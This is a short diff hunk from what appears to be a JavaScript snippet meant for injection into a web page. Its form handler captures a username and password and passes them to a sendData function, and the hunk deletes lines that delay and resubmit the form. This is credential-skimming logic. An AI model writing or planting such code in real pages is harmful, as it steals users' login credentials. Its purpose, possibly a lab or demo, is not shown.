@@ -31,9 +31,6 @@
                     alert(username+password);
                     console.log(username+password);
                     sendData(username, password);
-                    
-                    event.preventDefault();
-                    setTimeout(() => { event.target.submit(); }, 1000);
                 }
             });
         `;
